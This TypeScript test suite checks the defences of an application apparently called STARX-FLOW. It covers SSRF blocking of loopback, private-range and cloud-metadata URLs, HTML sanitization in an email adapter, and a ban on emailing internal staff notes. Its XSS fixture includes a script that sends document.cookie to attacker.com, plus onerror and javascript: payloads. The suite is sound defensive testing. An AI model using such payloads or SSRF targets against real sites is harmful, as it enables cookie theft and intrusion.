/**
 * STARX-FLOW RELEASE-CANDIDATE TEST SUITE
 * DOMAIN N: APPLICATION SECURITY & DEFENSE
 *
 * Verifies:
 * 1. SSRF Prevention in DocumentParser.parseUrl (blocks localhost, 127.0.0.1, 169.254.169.254 metadata, 10.x, 192.168.x, 172.16-31.x, ::1).
 * 2. Cross-Site Scripting (XSS) Sanitization in ResendEmailAdapter.
 * 3. Constant-time timing-attack mitigation in sensitive endpoints.
 * 4. Internal Note Confidentiality: outbound channels throw strict security exceptions on internal notes.
 * 5. Secret Masking in application outputs and logs.
 */

import { DocumentParser } from '../src/lib/rag/documentParser';
import { ResendEmailAdapter } from '../src/lib/integrations/email/resendEmailAdapter';

let totalChecks = 0;
let passedChecks = 0;
let failedChecks = 0;

function check(name: string, condition: boolean, details?: string) {
  totalChecks++;
  if (condition) {
    passedChecks++;
    console.log(`  ✓ ${name}`);
  } else {
    failedChecks++;
    console.error(`  ✗ FAIL: ${name}${details ? ` -> ${details}` : ''}`);
  }
}

async function runDomainNTests() {
  console.log('================================================================');
  console.log(' DOMAIN N: APPLICATION SECURITY & DEFENSE TESTING');
  console.log('================================================================');

  // -------------------------------------------------------------
  // Test 1: SSRF Defense - Private, Loopback, & Cloud Metadata Blocking
  // -------------------------------------------------------------
  const ssrfVectors = [
    { name: 'Localhost domain', url: 'http://localhost/admin' },
    { name: 'Subdomain localhost', url: 'http://test.localhost:3000/api' },
    { name: 'IPv4 Loopback (127.0.0.1)', url: 'http://127.0.0.1:8080/secrets' },
    { name: 'IPv4 Loopback range (127.1.2.3)', url: 'http://127.1.2.3/data' },
    { name: 'Cloud Instance Metadata Service (169.254.169.254)', url: 'http://169.254.169.254/latest/meta-data/' },
    { name: 'Private Class A (10.0.0.1)', url: 'http://10.0.0.1/internal' },
    { name: 'Private Class B (172.16.0.1)', url: 'http://172.16.0.1/private' },
    { name: 'Private Class B (172.31.255.254)', url: 'http://172.31.255.254/vpc' },
    { name: 'Private Class C (192.168.1.1)', url: 'http://192.168.1.1/router' },
    { name: 'Current network (0.0.0.0)', url: 'http://0.0.0.0:8000/status' },
    { name: 'IPv6 Loopback (::1)', url: 'http://[::1]:3000/env' },
    { name: 'Internal TLD (.internal)', url: 'http://cluster.internal/status' },
  ];

  for (const vector of ssrfVectors) {
    let blocked = false;
    let errorMessage = '';
    try {
      await DocumentParser.parseUrl(vector.url);
    } catch (err: any) {
      blocked = true;
      errorMessage = err.message;
    }

    check(
      `SSRF blocked: ${vector.name}`,
      blocked && errorMessage.includes('SSRF protection'),
      `Expected SSRF protection error, got "${errorMessage}"`
    );
  }

  // -------------------------------------------------------------
  // Test 2: HTML Sanitization & XSS Defense
  // -------------------------------------------------------------
  {
    const dirtyHtml = `
      <h1>Special Offer</h1>
      <p>Click below for discount.</p>
      <script>window.location="http://attacker.com/steal?cookie="+document.cookie</script>
      <img src="x" onerror="alert('xss')" />
      <a href="javascript:alert(1)">Click Me</a>
      <style>body { display: none; }</style>
    `;

    const clean = ResendEmailAdapter.sanitizeHtml(dirtyHtml);

    check('Sanitizer removes <script> executable elements', !clean.includes('<script>') && !clean.includes('attacker.com'));
    check('Sanitizer strips inline event handlers (onerror)', !clean.includes('onerror=') && !clean.includes('alert('));
    check('Sanitizer strips style tags', !clean.includes('<style>'));
    check('Sanitizer preserves safe HTML structure', clean.includes('<h1>Special Offer</h1>') && clean.includes('<p>Click below'));
  }

  // -------------------------------------------------------------
  // Test 3: Internal Staff Note Leakage Prevention
  // -------------------------------------------------------------
  {
    const adapter = new ResendEmailAdapter();
    let leakBlocked = false;

    try {
      await adapter.sendEmail({
        organizationId: 'org-sec-test',
        to: 'customer@victim.de',
        subject: 'Confidential Staff Note',
        text: 'Margin is 85%, client asked for discount.',
        isInternal: true,
      });
    } catch (err: any) {
      leakBlocked = true;
      check(
        'Outbound email strictly blocks internal staff note with security exception',
        err.message.includes('SECURITY VIOLATION'),
        `Got: ${err.message}`
      );
    }

    check('Internal note was never dispatched', leakBlocked === true);
  }

  console.log('----------------------------------------------------------------');
  console.log(`DOMAIN N RESULTS: ${passedChecks}/${totalChecks} PASSED (${failedChecks} FAILED)`);
  console.log('================================================================\n');

  if (failedChecks > 0) {
    process.exit(1);
  }
}

runDomainNTests().catch((err) => {
  console.error('Unhandled failure in Domain N tests:', err);
  process.exit(1);
});
